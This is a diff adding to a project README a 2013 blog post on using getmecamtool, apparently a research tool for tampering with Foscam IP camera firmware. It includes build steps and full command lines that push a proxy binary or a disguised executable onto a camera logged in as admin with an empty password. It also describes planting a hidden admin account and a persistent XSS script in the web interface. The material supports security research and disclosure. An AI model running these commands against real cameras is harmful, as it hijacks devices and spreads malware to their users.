@@ -5,3 +5,72 @@ Building the source
  $ cmake ..
  $ make 
 
+Original information from http://blog.shekyan.com/2013/05/using_getmecamtool.html
+
+05/20/2013
+
+Using getmecamtool
+
+To support the presentation about controlling IP cameras all over the world, we'll try to share some details on what the getmecamtool is doing and how to make it work.
+
+getmecamtool is a tool-set to manipulate software of Foscam FI8910W, FI8908W, FI8909W and their clones.
+
+It has the following components:
+- packer/unpacker for system, WebUI and camera settings files (syspack, sysextract, uipack, uiextract, confpack, confextract)
+- the main shell script that automates the flow with predefined commands (getmecamtool)
+
+getmecamtool DOES NOT bypass authentication or get credentials for you. Instead, authentication credentials should be provided to the tool to successfully manipulate the camera software.
+
+Check out the presentation to get the idea on how credentials can be potentially harvested.
+
+Before building getmecamtool, there are couple of prerequisites:
+- genromfs is needed to manipulate romfs, which is used on the camera ($ sudo apt-get install genromfs)
+- cmake is required to build the getmecamtool ($ sudo apt-get install cmake)
+
+Once ready, get getmecamtool from github
+
+$ git clone https://github.com/artemharutyunyan/getmecamtool
+$ cd getmecamtool
+$ mkdir build
+$ cd build
+$ cmake ..
+$ make
+
+But we are not done with the installation yet. getmecamtool requires to have a library of firmware files, normally distributed by the camera vendors. Due to legal issues, we are not hosting that software, but you can easily re-create the directory structure and download necessary files by yourself.
+
+Create fwlib directory somewhere. In our examples, we assume it is next to getmecamtool directory cloned from github. The fwlib/ directory should contain unmodified dystem firmware and Web UI from camera vendor.
+
+When run, getmecamtool will determine the current version of dystem firmware (or webUI depending on the operation) on the camera and will try to locate the corresponding file in fwlib directory. Typically,  camera vendors package both system firmware and webUI within the same .zip archive. fwlib should contain two subdirectories sys/ and web/, where corresponding original files should be placed.  For example a directory structure for a camera with webUI version 1.2.3.4 and system firmware version 5.6.7.8 should look like this:
+
+fwlib
+- sys
+  - lr_cmos_5_6_7_8.bin  
+- web
+  - 1.2.3.4.bin
+
+Here is an example of running the tool to inject a proxy server or anything else that can be cross-compiled using tools from the corresponding with board support package. We used board support package supplied for Winbond W90N745 board available here:
+
+$ sudo env PATH=$PATH:$(pwd)/../build/bin ./getmecamtool -a X.X.X.X:80 -u admin -p '' -c inject_proxy -e /home/sergey/camtool/getmecamtool/misc/proxy/proxy -s ../../fwlib -o 81
+
+which tells the tool to:
+- connect to X.X.X.X:80
+- authenticate with 'admin' username and empty password
+- determine the version of system firmware running on the camera, get same version from fwlib, unpack it, embed proxy binary into it
+- change the camera settings to make web server listen to port 81 (and proxy would listen on the old port, 80 in this case)    
+- pack the system firmware file back, verify the integrity, push it on the camera and restart it
+
+sudo is required by mount, which is used to mount the romfs that was extracted from the system firmware.
+
+We chose to push a proxy on the camera, because it demonstrates how an attacker can utilize the forwarded port on NAT by making proxy server listen to it. If the client is aware that it's a proxy - it acts as a proxy, otherwise it acts as a reverse proxy by forwarding requests to local web server on a camera.
+
+Another example runs the tool to host an arbitrary file on the camera, making it, for instance, a malware distributor:
+
+$ sudo env PATH=$PATH:$(pwd)/../build/bin ./getmecamtool -a X.X.X.X:80 -u admin -p '' -c host_file -f /home/sergey/camtool/getmecamtool/misc/install_flash_player.exe -s ../../fwlib
+
+tells the tool to:
+- connect to X.X.X.X:80
+- authenticate with 'admin' username and empty password
+- determine the version of webUI firmware running on the camera, get same version from fwlib, unpack it, embed install_flash_player.exe  into it
+- pack the webUI firmware file back, verify the integrity, push it on the camera and restart it
+
+Two other commands are inject_exec and poison_webui. First one would inject arbitrary executable, and the second one will add a user with admin role and patch the webUI to hide it, as well as it adds a line to one of HTML files to source a javascript from external location, demonstrating how easy is to have a persistant XSS in the victim's browser.
